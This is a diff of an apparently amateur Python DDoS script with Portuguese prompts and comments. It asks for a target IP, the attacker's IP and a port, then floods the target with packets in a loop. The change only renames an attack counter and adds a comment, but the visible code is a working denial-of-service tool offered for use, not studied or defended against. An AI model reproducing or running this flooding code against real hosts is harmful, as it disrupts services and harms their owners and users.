@@ -17,7 +17,8 @@ os.system("clear")
 alvo = input('IP do alvo: ')
 seuip = input('Seu IP: ')
 port = input('Digite a porta do IP: ') 
-numerodeataque = 0
+#aqui é o set de ataques, para contar a quantidade... que será visível no output
+attack_num = 0
 print('Começando ataque...')
 print('Caso o terminal pare o processo de DDos, tente executar o código novamente e alterar a port, ou verificar se o ip inserido é válido.')
 time.sleep(1)
@@ -34,8 +35,8 @@ def attack():
         s.sendto(("Host: " + seuip + "\r\n\r\n").encode('ascii'), (alvo, port))
         
         global attack_num
-        numerodeataque += 1
-        print(numerodeataque)
+        attack_num += 1
+        print(attack_num)
         
         s.close()
 #final do código
